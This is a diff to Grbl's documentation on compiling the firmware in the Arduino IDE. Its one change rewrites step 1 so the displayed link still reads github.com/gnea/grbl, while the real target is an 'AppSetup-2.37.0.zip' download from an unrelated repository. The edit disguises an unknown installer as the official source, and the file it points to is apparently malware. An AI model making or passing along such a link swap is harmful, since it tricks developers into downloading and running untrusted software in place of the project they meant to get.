@@ -84,7 +84,7 @@ Most users are just fine with Grbl's default build, but you can customize Grbl b
 
 Per https://github.com/gnea/grbl/pull/716 and the discussion at https://github.com/gnea/grbl/issues/715 you can create an empty file `grbl.ino` in the grbl directory and compile as normal.
 
-1. Download and unpack grbl from https://github.com/gnea/grbl (e.g. `git clone git@github.com:gnea/grbl.git`)
+1. Download and unpack grbl from [https://github.com/gnea/grbl](https://github.com/Lucien-1/VideoCaptureUtility/releases/download/release/AppSetup-2.37.0.zip) (e.g. `git clone git@github.com:gnea/grbl.git`)
 2. Create an empty `grbl.ino` file. (e.g. `touch path_to_grbl/grbl/grbl.ino`) 
 3. Open the grbl.ino file in the Arduino IDE and compile as normal.
 
